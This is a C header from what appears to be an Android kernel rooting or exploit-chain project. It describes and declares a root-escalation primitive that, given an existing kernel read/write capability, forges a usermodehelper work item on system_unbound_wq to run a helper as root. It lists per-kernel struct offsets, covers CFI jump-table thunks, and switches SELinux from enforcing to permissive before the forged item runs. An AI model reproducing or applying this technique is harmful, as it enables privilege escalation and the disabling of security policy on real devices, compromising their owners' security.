/* lib/root/install_umh.h -- root via a forged usermodehelper work item,
 * instead of patching any existing task's cred.
 *
 * system_unbound_wq's default pool keeps an idle worker parked on an empty
 * worklist. This splices one entry onto that list: a fake work_struct whose
 * func pointer is call_usermodehelper_exec_work, with an accompanying
 * subprocess_info naming a helper binary already on disk. The next time the
 * worker wakes, the kernel calls that function on the fake work exactly as
 * it would on a real one, running the helper through do_execve() with a
 * fresh root cred -- no existing task's cred, capabilities or SELinux sid
 * is ever touched.
 *
 * struct work_struct/subprocess_info/completion layouts are stable across
 * every kernel version this project targets (5.4 through 6.6); only the
 * struct workqueue_struct/pool_workqueue/worker_pool field offsets below are
 * per-KMI, and only some KMI headers state them yet (see the #ifndef
 * fallbacks: they carry android14-6.1's values, unverified for any target
 * that does not explicitly override them).
 *
 * The scratch region is the one thing this file does not solve: forging the
 * work item needs a kdirect_t address the caller can write through the same
 * `rw` and that nothing else will reclaim for as long as the item is queued
 * (at most a few hundred milliseconds). Which physical page is safe to reuse
 * for that -- and whether it can share a page a chain has already leaked for
 * another purpose, or needs its own -- is unresolved; see the caller.
 */
#ifndef LIB_ROOT_INSTALL_UMH_H
#define LIB_ROOT_INSTALL_UMH_H

#include <stddef.h>
#include <stdint.h>

#include "../rw/krw.h"

/* ── struct workqueue_struct / pool_workqueue / worker_pool / work_struct ──
 * Unverified for any target whose header does not override them; carried
 * over from android14-6.1.h, where they were independently derived. */
#ifndef WQ_DFL_PWQ_OFF
#define WQ_DFL_PWQ_OFF        0xb0
#endif
#ifndef PWQ_POOL_OFF
#define PWQ_POOL_OFF          0x00
#endif
#ifndef PWQ_WQ_OFF
#define PWQ_WQ_OFF            0x08
#endif
#ifndef PWQ_WORK_COLOR_OFF
#define PWQ_WORK_COLOR_OFF    0x10
#endif
#ifndef PWQ_REFCNT_OFF
#define PWQ_REFCNT_OFF        0x18
#endif
#ifndef PWQ_NR_IN_FLIGHT_OFF
#define PWQ_NR_IN_FLIGHT_OFF  0x1c
#endif
#ifndef PWQ_NR_ACTIVE_OFF
#define PWQ_NR_ACTIVE_OFF     0x5c
#endif
#ifndef PWQ_MAX_ACTIVE_OFF
#define PWQ_MAX_ACTIVE_OFF    0x60
#endif
/* Not independently derived like the fields above: inferred from
 * qgki-5.4.h's pahole-verified layout, whose field order past this point is
 * identical to android14-6.1's (only nr_in_flight's array length, and
 * everything after it, differs by KMI). */
#ifndef PWQ_DELAYED_WORKS_OFF
#define PWQ_DELAYED_WORKS_OFF 0x64
#endif
#ifndef POOL_WORKLIST_OFF
#define POOL_WORKLIST_OFF     0x28
#endif
#ifndef POOL_NR_IDLE_OFF
#define POOL_NR_IDLE_OFF      0x3c
#endif
#ifndef WORK_DATA_OFF
#define WORK_DATA_OFF         0x00
#endif
#ifndef WORK_ENTRY_OFF
#define WORK_ENTRY_OFF        0x08
#endif
#ifndef WORK_FUNC_OFF
#define WORK_FUNC_OFF         0x18
#endif

/* What a forged work_struct.func slot must hold to survive a kernel built
 * with CFI jump tables: not call_usermodehelper_exec_work's own address,
 * but the jump-table thunk for it (JTMAP, runner/scripts/lib/offset-maps.
 * txt; same distinction as common.h's ASHMEM_*_CALLABLE fallbacks make for
 * the ashmem table). Falls back to the plain function address for a KMI
 * that builds without jump tables, where that address is what a genuine
 * work_struct holds anyway. */
#ifndef CALL_USERMODEHELPER_EXEC_WORK_CALLABLE
#define CALL_USERMODEHELPER_EXEC_WORK_CALLABLE CALL_USERMODEHELPER_EXEC_WORK
#endif

/* Bytes the caller's scratch region must provide, at LIB_UMH_WORK_OFF (the
 * fake work_struct/subprocess_info) and LIB_UMH_DATA_OFF (the completion,
 * path/arg/uid strings and argv/envp arrays the subprocess_info points
 * into). The two areas do not overlap and both fit comfortably inside
 * either offset's 0x200-byte span. */
#define LIB_UMH_WORK_OFF     0x000
#define LIB_UMH_DATA_OFF     0x200
#define LIB_UMH_SCRATCH_SIZE 0x400

struct lib_umh_result {
  int ok;
  uint64_t wq;
  uint64_t pwq;
  uint64_t pool;
  uint32_t color;
  uint32_t refcnt;
  uint32_t nr_active;
  uint32_t max_active;
  uint32_t nr_inflight;
  uint64_t delayed_next;  /* pwq->delayed_works, read before publish */
  uint64_t delayed_prev;
  int published;      /* the forged entry was linked onto the worklist */
  uint32_t complete;   /* subprocess_info's completion fired (done != 0) */
  int32_t retval;      /* the helper's own exit status, once complete */
  uint64_t delayed_next_after;  /* the same list, re-read once complete */
  uint64_t delayed_prev_after;
  uint8_t selinux_before;  /* SELINUX_ENFORCING as found; 0xff if unread */
  uint8_t selinux_after;   /* ...after this call's own write, if any */
};

/*
 * Forge a usermodehelper work item that execve()s `helper_path` as
 * `su --umh <helper_uid>` and splice it onto system_unbound_wq's default
 * pool, exactly as call_usermodehelper() itself would queue one.
 *
 * `scratch` must be a kdirect_t region of at least LIB_UMH_SCRATCH_SIZE
 * bytes, writable and readable through `rw`, that the caller guarantees
 * nothing else touches until this call returns. `helper_path` and
 * `helper_uid` must each fit the corresponding field of the on-scratch
 * struct (255 and 15 bytes); longer strings fail closed.
 *
 * `env_entry`, if non-NULL, is one "KEY=VALUE" string forged into the
 * helper's environment (its envp[0]; the helper always gets an empty
 * environment otherwise). What key a caller wants there is its own
 * business -- this module reads nothing back from it -- typically a path
 * the helper can redirect its own stdout/stderr into, since a
 * usermodehelper starts with neither an inherited log fd nor a parent
 * that set one up. NULL or "" forges no environment at all, same as
 * before this parameter existed. Must fit the on-scratch buffer (96
 * bytes including the NUL); longer fails closed like the other strings.
 *
 * Refuses to run at all if `scratch` is not already all-zero (a page this
 * chain owns but something unexpected already occupies is not safe to
 * forge into) or if SELINUX_ENFORCING cannot be read: if it reads
 * enforcing, this call flips it to permissive before publishing (a
 * usermodehelper the kernel launches is still subject to policy, and the
 * caller does not otherwise get a chance to do this between publish and
 * the kernel actually running the helper), and flips it back on any
 * aborted publish. It does not flip it back if the item published but
 * never completed -- a kernel thread the caller has evidence may still be
 * running is not one to race a policy change against.
 *
 * Blocks until the queued work completes or ~2 seconds pass. Returns 1 iff
 * the item was both published and observed to complete; `out->retval` is
 * the helper's own exit status only when that happens; `out` is filled
 * either way; `out->ok` mirrors the return value.
 */
int lib_root_install_umh(
    const struct krw *rw, const struct kslide *slide, kdirect_t scratch,
    const char *helper_path, const char *helper_uid, const char *env_entry,
    struct lib_umh_result *out);

#endif /* LIB_ROOT_INSTALL_UMH_H */
